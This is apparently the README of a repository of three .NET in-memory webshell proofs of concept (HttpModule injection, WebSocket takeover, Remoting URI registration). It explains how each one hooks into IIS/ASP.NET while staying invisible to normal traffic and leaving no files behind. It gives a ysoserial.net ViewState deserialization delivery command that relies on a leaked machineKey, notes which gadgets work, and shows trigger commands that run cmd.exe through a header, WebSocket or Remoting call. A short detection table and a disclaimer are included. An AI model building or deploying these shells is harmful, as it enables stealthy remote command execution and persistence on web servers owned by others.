# dotnet-memshell-poc

三个 .NET 内存马 PoC：**HttpModule 管线注入**、**WebSocket 连接接管**、**Remoting 容器 URI 注册**。
三者插入位置互不相同，且都以"业务无感知"为设计约束：无标记的正常请求零扰动、不修改 `web.config`、不落地文件、不新增监听端口（WS/Remoting 复用业务端口，HttpModule 挂在请求管线本身）。

> **免责声明**：本项目仅用于授权渗透测试与防御研究。使用者需对目标拥有书面授权，并对自己的行为负责。项目维护者不对任何滥用行为承担责任。

## 总览

| # | 内存马 | 插入位置 | 触发方式 | 最低权限 | 业务影响 |
|---|---|---|---|---|---|
| 1 | **HttpModuleShell** | `HttpApplication` 模块事件管线 | 任意请求带 `MSH-Cmd: <命令>` 头 | w3wp 默认应用池身份 | 无标记请求零扰动 |
| 2 | **WsTakeoverShell** | HTTP→WebSocket 升级点（连接接管） | 握手子协议含 `msh` | 同上 + 集成管线 + WS 特性 | 非握手请求严格 no-op |
| 3 | **RemotingUriShell** | 既有 Remoting 通道的 AppDomain 全局 URI 表 | remoting 调用 `<通道>/msh` 的 `Exec` | 同上 + 业务在同 AppDomain 跑 Remoting | 业务 URI 与 shell 并存互不影响 |

三者在 ASP.NET 请求处理架构中的位置：

```
HTTP.sys / IIS
 └─ ASP.NET 请求管线
     ├─ ① 模块事件（BeginRequest / Authenticate…）   ← #1 HttpModuleShell（经典位置，本 PoC 做了池广播强化）
     ├─ ② 路由 / 虚拟路径 / handler / endpoint       （已知位置家族：Route / VPP / Handler / asmx，本repo不涉及）
     └─ 升级点（HTTP→WS 握手）                        ← #2 WsTakeoverShell（管线终止、连接让渡）

进程内其他协议栈
 └─ 既有 Remoting 服务端通道                          ← #3 RemotingUriShell（容器式端点注册）
```

---

## 1. HttpModuleShell

**文件**：`payloads/HttpModuleShell.cs`（单文件，编译引用 `System.dll;System.Web.dll`）

### 调用链

```
[投递] 反序列化执行 E()
 ├─ HttpContext.Current.ApplicationInstance                 ← 当前处理请求的实例
 └─ HttpApplicationFactory._theApplicationFactory._freeList ← 池内其余实例（池广播）
      每个实例二选一：
      ├─ 集成管线: HttpApplication.GetModuleContainer(<module>)
      │     → new SyncEventExecutionStep(app, OnRequest)     [反射构造嵌套私有类型]
      │     → ModuleContainer.AddEvent(RequestNotification.BeginRequest, false, step)
      └─ 经典管线 : ApplicationStepManager._execSteps 末尾追加同一 step

[触发] 请求 → HttpApplication 管线 → BeginRequest 通知 → 注入的 step → OnRequest
      ├─ 无 MSH-Cmd 头 → 直接 return（业务请求原样走完全程）
      └─ 有头 → cmd.exe /c <命令> → Response.Write(输出) → Response.End()
```

要点：
- **池广播**是本 PoC 对社区已知手法的关键强化：`HttpApplication` 是池化对象，只武装"投递时正在服务的那个实例"会导致后续大部分请求打不中；必须遍历 `_freeList` 给所有空闲实例挂上（`_done` 列表去重防止重复注入）。
- 集成/经典双路径自适应：集成管线下 `GetModuleContainer` 有效；经典或自托管管线下退化为 `_execSteps` 追加（**只能追加到末尾**——插入到当前 step 索引之前会让 `ResumeSteps` 重执行当前步骤，造成请求重入）。

### 权限要求

- w3wp 默认应用池身份（ApplicationPoolIdentity / NetworkService），**无需管理员**；
- Full Trust（反射 NonPublic 成员 + `Process.Start`；Medium/Partial Trust 下 CAS 会拦截）；
- 无 URLACL / 注册表 / 文件系统操作。

### 业务影响

- 无 `MSH-Cmd` 头的请求：`OnRequest` 第一行判断后直接返回，管线其余步骤与响应完全不变；
- 带 `MSH-Cmd` 头的请求：被 shell 接管应答（这即是其功能，不是副作用）；
- 不改 `web.config`、不注册 module/handler/route、不在 bin 落地文件。

---

## 2. WsTakeoverShell

**文件**：`payloads/WsTakeoverShell.cs`（编译引用 `System.dll;System.Web.dll`）

.NET 版的"WebSocket 内存马"思想：不做请求/应答式 webshell，而是在**协议升级点**把连接从请求管线手里拿走，变成全双工命令通道。与 Java 侧对应物的差异：.NET Framework 没有 Tomcat 式的 WS 容器端点注册表，运行期端点注册不可行，因此接管通过 `HttpContext.AcceptWebSocketRequest` 在握手请求内联完成（等价于 wsMemShell 的 `UpgradeUtil.doUpgrade` 内联升级变体）。

### 调用链

```
[投递] 同 #1（同一套锚点挂 OnRequest；该处理函数对非握手请求是严格 no-op）

[触发] GET + Upgrade: websocket + Connection: Upgrade + Sec-WebSocket-Protocol: msh
 → OnRequest
      ├─ HttpContext.IsWebSocketRequest 校验（要求集成管线）
      ├─ 子协议包含 "msh" ？（魔因子，避开业务自身的 WS 流量）
      └─ ctx.AcceptWebSocketRequest(Duplex)
           ← 连接升级，请求管线到此终止，该 TCP 连接由 Duplex 独占
           循环: Receive(text=命令) → cmd.exe /c → Send(text=输出)，直至 Close 帧
```

### 权限要求

- w3wp 默认应用池身份，无需管理员；
- **不注册 http.sys 前缀、不 bind 新端口**——完全骑在站点既有的 80/443 上（对比：HttpListener 型内存马需要 `netsh http add urlacl`，属管理员动作）；
- 环境前提（服务器安装期配置，非进程权限）：IIS 集成管线 + WebSocket 特性已启用（Server 2012+ 常见默认）。非集成管线下 `IsWebSocketRequest`/`AcceptWebSocketRequest` 抛异常，注入的处理器捕获后静默放行。

### 业务影响

- 非握手请求、不含 `msh` 子协议的握手（业务自己的 WS）：处理器直接返回，零扰动；
- 仅"带 msh 子协议的那一条连接"被升级接管；
- **优雅降级（已实测）**：在非集成管线环境（classic 池/自托管）`AcceptWebSocketRequest` 抛异常被捕获，握手请求照常按普通请求返回 200，站点无感；
- 响应面（对蓝队）：不新增端口/端点；只有 WS 子协议名与连接生命周期两个可观测点。

---

## 3. RemotingUriShell

**文件**：`payloads/RemotingUriShell.cs`（编译引用 `System.dll;System.Runtime.Remoting.dll`）

Remoting 版的"容器端点注册"：`RemotingConfiguration.RegisterWellKnownServiceType` 是 **AppDomain 全局**的 URI 表——在已注册的服务端通道上追加一个新 URI，即获得"同端口、同通道、不碰业务注册"的内存马，思路与 wsMemShell 在 WS 容器里 `addEndpoint` 同构。

### 调用链

```
[投递] 反序列化执行 E()
 ├─ AppDomain.CurrentDomain.AssemblyResolve += 桥接
 │    （载荷程序集是 byte[] 加载、无文件；而 remoting 服务端 formatter
 │      按"程序集名"解析 well-known 类型，必须把解析桥回已加载实例）
 ├─ 检查 ChannelServices.RegisteredChannels 存在 IChannelReceiver
 │    （业务必须已在该 AppDomain 注册服务端通道，否则放弃，不动任何东西）
 └─ RemotingConfiguration.RegisterWellKnownServiceType(E.Svc, "msh", Singleton)

[触发] remoting 客户端 → tcp://<host>:<业务端口>/msh → Svc.Exec(cmd) → 返回输出
      （业务自身的 /calc、/whatever 等 URI 与 /msh 共享同一通道，互不影响）
```

### 权限要求

- w3wp 默认应用池身份，无需管理员；
- 前提：目标 AppDomain 内已有 Remoting 服务端通道（业务自托管 Remoting、或在 ASP.NET 里 `RegisterChannel` 的场景）。

### 客户端约束（重要）

remoting 方法调用消息会携带**客户端代理的类型全名**（`<type>, <clientAssembly>`），服务端 formatter 在分发前要解析它。因此独立客户端的 stub 必须与服务端服务类**同名嵌套**（`E.Svc`，见 `tools/RemotingShellClient.cs`）；任意程序集名都可行，因为载荷把失败的程序集解析全部桥接回自身。

### 业务影响

- 不注册新通道、不占新端口：shell URI 由**业务的**通道和端口提供服务；
- 业务对象的注册表项原样不动；
- 生命周期：挂在 worker AppDomain 上，应用池回收即失效（与其他 in-process 内存马一致）。

---

## 投递（Delivery）

三个载荷都是"反序列化时构造函数执行"的单文件类，按 ysoserial.net 的文件载荷用法编译：

```
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile ^
  -c "payloads\HttpModuleShell.cs;System.dll;System.Web.dll" ^
  --decryptionalg=AES --decryptionkey=<64位十六进制解密键> ^
  --validationalg=HMACSHA256 --validationkey=<64位十六进制校验键> ^
  --path=/Default.aspx --apppath=/

# 产物 POST 到目标任意启用 ViewState 的页面：
#   __VIEWSTATE=<payload>
# （RemotingUriShell 把 System.Web.dll 换成 System.Runtime.Remoting.dll；
#   WsTakeoverShell 与 HttpModuleShell 相同）
```

前提：目标 `machineKey` 已知/泄露（`validationKey`+`decryptionKey`，或同 farm 共享键可推导）。

### gadget 实测结论（重要）

| gadget | 反序列化时是否执行 | 说明 |
|---|---|---|
| `XamlAssemblyLoadFromFile` | ✅ | XAML 解析期 `Assembly.Load` 载荷程序集并实例化入口类——**本项目采用** |
| `ActivitySurrogateSelectorFromFile` | ❌ | 其 `AxHost.State` 包装对 `PropertyBagBinary` 是惰性的（仅包成 `PropertyBagStream`，不触发反序列化），普通 ViewState 打不动（实测） |
| `TypeConfuseDelegate` | ⚠️ | 会执行但走 `Process.Start`，子进程形态，不符合内存马定义 |

另两个工程事实：
- ysoserial 的 ViewState 插件内部 `Uri.EscapeDataString` 有约 32K 字符输入上限——若把载荷改造成"内嵌大程序集"形态（把整个 shell dll base64 进载荷类），需 gzip 压缩后嵌入；
- 投递那一次 POST 会得到一个 viewstate 校验错误页（反序列化对象非合法页面状态），属**一次性**日志痕迹；其后请求一切正常。

## 本地测试（不依赖 ysoserial）

```
tools\build.ps1                        # 编译 bin\Payload_*.dll
# 将 tools\Loader.aspx 放入本地测试站点（实验用加载器，切勿用于生产）
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("bin\Payload_HttpModule.dll"))
Invoke-WebRequest http://localhost:5555/Loader.aspx -Headers @{ 'MSH-Load' = $b64 }

# #1 触发：
Invoke-WebRequest http://localhost:5555/Default.aspx -Headers @{ 'MSH-Cmd' = 'whoami' }

# #2 触发（任意 WS 客户端，如 PowerShell）：
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.Options.AddSubProtocol('msh')
$ws.ConnectAsync([Uri]'ws://localhost:5555/Default.aspx', [Threading.CancellationToken]::None).Wait()
#   Send("whoami") → Receive 输出

# #3 触发（目标站点需已有 remoting 通道，例如 tcp://localhost:9999）：
bin\RemotingShellClient.exe tcp://localhost:9999/msh "whoami"
```

## 检测与防御

| 内存马 | 检测面 |
|---|---|
| HttpModuleShell | 各 `HttpApplication` 实例 module container 的步骤清单 / `ApplicationStepManager._execSteps` 长度与框架构建值比对；`AppDomain.GetAssemblies()` 中 `Location` 为空的程序集（byte[] 加载）；`BeginRequest` 阶段出现 `Response.End` 的异常模式 |
| WsTakeoverShell | WS 握手中的陌生子协议；升级后长存于管线外的连接；`_execSteps`/模块容器同上 |
| RemotingUriShell | 反射枚举 `RemotingConfiguration` 内部 well-known 表，发现非业务声明的 URI；非业务程序集注册的 `MarshalByRefObject` 服务 |
| 通用 | machineKey 视同高危凭据管理（泄露 = ViewState 反序列化 RCE 面）；对 worker 进程派生 `cmd.exe` 子进程的行为监控 |

## 验证摘要

在 Windows + .NET Framework 4.8 自托管 ASP.NET 靶场（无 IIS，classic 管线）对**本仓库发布物**实测：

| 项 | 结果 |
|---|---|
| HttpModuleShell.dll（Loader 注入） | 带 `MSH-Cmd` 请求返回命令输出；无标记请求持续 200 |
| RemotingUriShell.dll（Loader 注入） | 独立客户端 `RemotingShellClient.exe tcp://host:port/msh` 执行命令成功；**业务 URI 同通道并存不受影响** |
| WsTakeoverShell.dll（Loader 注入） | classic 管线下按设计优雅降级：握手请求照常 200，站点无感；升级路径（`AcceptWebSocketRequest`）要求 IIS 集成管线 + WS 特性 |
| 经典管线 `_execSteps` 追加 | 实测命中；集成路径按引用源码走查（本靶场无集成管线） |

环境注记：自托管 harness 的 `SimpleWorkerRequest` 不经缓冲直写输出，因此 classic 路径下 shell 应答会混入页面残片；真实 IIS 有输出缓冲，`Response.Clear()+Write()+End()` 输出干净。

## 引用

- [veo/wsMemShell](https://github.com/veo/wsMemShell) — WebSocket 内存马思想来源（Java 侧）
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) — 投递载荷生成
- HttpModule 注入手法源自 2023 年中文安全社区的公开研究；本 PoC 增加了 HttpApplication 池广播与经典管线回退。

## License

MIT
